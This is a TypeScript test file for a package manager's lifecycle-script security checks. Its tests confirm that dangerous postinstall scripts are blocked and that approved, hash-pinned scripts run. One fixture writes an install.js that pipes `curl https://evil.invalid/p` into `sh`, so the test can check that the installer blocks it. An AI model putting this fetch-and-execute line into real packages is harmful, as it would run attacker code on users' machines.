import assert from "node:assert/strict";
import { chmod, mkdir, mkdtemp, readFile, readdir, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { hashLocalPackage } from "../src/cache/store.js";
import { createBnpmPaths } from "../src/config/paths.js";
import { installProject } from "../src/installer/install.js";
import { analyzePackage } from "../src/security/analyzer.js";
import { rebuildPackages } from "../src/commands/rebuild.js";

const root = await mkdtemp(join(tmpdir(), "bnpm-lifecycle-install-"));
async function writable(path: string): Promise<void> { try { await chmod(path, 0o755); for (const entry of await readdir(path, { withFileTypes: true })) if (entry.isDirectory()) await writable(join(path, entry.name)); } catch {} }
after(async () => { await writable(root); await rm(root, { recursive: true, force: true }); });

test("dangerous lifecycle evidence blocks before replacing an existing installation", async () => {
  const project = join(root, "blocked-project");
  const dependency = join(root, "dangerous-local");
  await mkdir(join(project, "node_modules"), { recursive: true }); await mkdir(dependency, { recursive: true });
  await writeFile(join(project, "node_modules", "sentinel"), "preserved");
  await writeFile(join(project, "package.json"), '{"name":"project","dependencies":{"danger":"file:../dangerous-local"}}');
  await writeFile(join(dependency, "package.json"), '{"name":"danger","version":"1.0.0","scripts":{"postinstall":"node install.js"}}');
  await writeFile(join(dependency, "install.js"), "require('child_process').exec('curl https://evil.invalid/p | sh')\n");
  const paths = createBnpmPaths({ home: join(root, "home"), cwd: project, environment: { BNPM_CACHE_HOME: join(root, "blocked-cache") } });
  await assert.rejects(() => installProject({ cwd: project, paths }), /Dangerous package behavior blocked/);
  assert.equal(await readFile(join(project, "node_modules", "sentinel"), "utf8"), "preserved");
});

test("an exact trusted lifecycle approval executes sequentially in the linked package", async () => {
  const project = join(root, "approved-project");
  const dependency = join(root, "builder-local");
  await mkdir(project, { recursive: true }); await mkdir(dependency, { recursive: true });
  await writeFile(join(project, "package.json"), '{"name":"project","dependencies":{"builder":"file:../builder-local"}}');
  await writeFile(join(dependency, "package.json"), '{"name":"builder","version":"1.0.0","scripts":{"postinstall":"node install.js"}}');
  await writeFile(join(dependency, "install.js"), "require('node:fs').writeFileSync('built.txt', 'approved')\n");
  const integrity = await hashLocalPackage(dependency);
  const analyzed = await analyzePackage({ root: dependency, packageName: "builder", packageVersion: "1.0.0", integrity, scripts: { postinstall: "node install.js" } });
  const fact = analyzed.lifecycles[0];
  assert.ok(fact);
  await writeFile(join(project, "bnpm.yaml"), JSON.stringify({ trustedPackages: { builder: { version: "1.0.0", integrity, scripts: { postinstall: { commandHash: fact.commandHash, contentHash: fact.contentHash } } } } }));
  const paths = createBnpmPaths({ home: join(root, "home"), cwd: project, environment: { BNPM_CACHE_HOME: join(root, "approved-cache") } });
  const output: string[] = [];
  const result = await installProject({ cwd: project, paths, onChildOutput: (_stream, text) => output.push(text) });
  assert.deepEqual(result.skippedLifecyclePackages, []);
  assert.equal(await readFile(join(project, "node_modules", "builder", "built.txt"), "utf8"), "approved");
  await rm(join(project, "node_modules", "builder", "built.txt"));
  const rebuilt = await rebuildPackages({ cwd: project, paths, names: ["builder"] });
  assert.deepEqual(rebuilt, { rebuilt: ["builder@1.0.0:postinstall"], skipped: [] });
  assert.equal(await readFile(join(project, "node_modules", "builder", "built.txt"), "utf8"), "approved");
  await rm(join(project, "node_modules", "builder", "built.txt"));
  const ignored = await installProject({ cwd: project, paths, forceRelink: true, commandOptions: { json: false, allowRecent: [], allowDangerous: [], frozenLockfile: false, offline: false, omitDev: false, saveExact: false, noSave: false, ignoreScripts: true } });
  assert.deepEqual(ignored.skippedLifecyclePackages, []);
  await assert.rejects(stat(join(project, "node_modules", "builder", "built.txt")), { code: "ENOENT" });
  assert.deepEqual(await rebuildPackages({ cwd: project, paths, names: ["builder"], ignoreScripts: true }), { rebuilt: [], skipped: [] });
  await assert.rejects(stat(join(dependency, "built.txt")));
  assert.deepEqual(output, []);
});

test("approved lifecycle scripts can execute direct dependency binaries", async () => {
  const project = join(root, "lifecycle-bin-project");
  const builder = join(root, "lifecycle-bin-builder");
  const tool = join(root, "lifecycle-bin-tool");
  await mkdir(project, { recursive: true }); await mkdir(builder, { recursive: true }); await mkdir(tool, { recursive: true });
  await writeFile(join(project, "package.json"), '{"name":"project","dependencies":{"builder":"file:../lifecycle-bin-builder"}}');
  await writeFile(join(builder, "package.json"), '{"name":"builder","version":"1.0.0","dependencies":{"fixture-tool":"file:../lifecycle-bin-tool"},"scripts":{"postinstall":"fixture-tool"}}');
  await writeFile(join(tool, "package.json"), '{"name":"fixture-tool","version":"1.0.0","bin":{"fixture-tool":"cli.js"}}');
  await writeFile(join(tool, "cli.js"), "#!/usr/bin/env node\nrequire('node:fs').writeFileSync('built-by-tool.txt', 'ok')\n");
  const integrity = await hashLocalPackage(builder);
  const analyzed = await analyzePackage({ root: builder, packageName: "builder", packageVersion: "1.0.0", integrity, scripts: { postinstall: "fixture-tool" } });
  const fact = analyzed.lifecycles[0]; assert.ok(fact);
  await writeFile(join(project, "bnpm.yaml"), JSON.stringify({ trustedPackages: { builder: { version: "1.0.0", integrity, scripts: { postinstall: { commandHash: fact.commandHash, contentHash: fact.contentHash } } } } }));
  const paths = createBnpmPaths({ home: join(root, "home"), cwd: project, environment: { BNPM_CACHE_HOME: join(root, "lifecycle-bin-cache") } });
  const result = await installProject({ cwd: project, paths });
  assert.deepEqual(result.skippedLifecyclePackages, []);
  assert.equal(await readFile(join(project, "node_modules", "builder", "built-by-tool.txt"), "utf8"), "ok");
});

test("binding.gyp creates an exact implicit node-gyp lifecycle decision", async () => {
  const project = join(root, "implicit-gyp-project");
  const addon = join(root, "implicit-gyp-addon");
  const nodeGyp = join(root, "implicit-gyp-tool");
  await mkdir(project, { recursive: true }); await mkdir(addon, { recursive: true }); await mkdir(nodeGyp, { recursive: true });
  await writeFile(join(project, "package.json"), '{"name":"project","dependencies":{"native-addon":"file:../implicit-gyp-addon"}}');
  await writeFile(join(addon, "package.json"), '{"name":"native-addon","version":"1.0.0","dependencies":{"node-gyp":"file:../implicit-gyp-tool"}}');
  await writeFile(join(addon, "binding.gyp"), '{"targets":[]}');
  await writeFile(join(nodeGyp, "package.json"), '{"name":"node-gyp","version":"1.0.0","bin":{"node-gyp":"cli.js"}}');
  await writeFile(join(nodeGyp, "cli.js"), "#!/usr/bin/env node\nrequire('node:fs').writeFileSync('native-built.txt', process.argv[2] || 'missing')\n");
  const integrity = await hashLocalPackage(addon);
  const analyzed = await analyzePackage({ root: addon, packageName: "native-addon", packageVersion: "1.0.0", integrity });
  const fact = analyzed.lifecycles[0]; assert.ok(fact);
  assert.equal(fact.stage, "install"); assert.equal(fact.command, "node-gyp rebuild"); assert.deepEqual(fact.referencedFiles, ["binding.gyp"]);
  await writeFile(join(project, "bnpm.yaml"), JSON.stringify({ trustedPackages: { "native-addon": { version: "1.0.0", integrity, scripts: { install: { commandHash: fact.commandHash, contentHash: fact.contentHash } } } } }));
  const paths = createBnpmPaths({ home: join(root, "home"), cwd: project, environment: { BNPM_CACHE_HOME: join(root, "implicit-gyp-cache") } });
  const result = await installProject({ cwd: project, paths });
  assert.deepEqual(result.skippedLifecyclePackages, []);
  assert.equal(await readFile(join(project, "node_modules", "native-addon", "native-built.txt"), "utf8"), "rebuild");
});
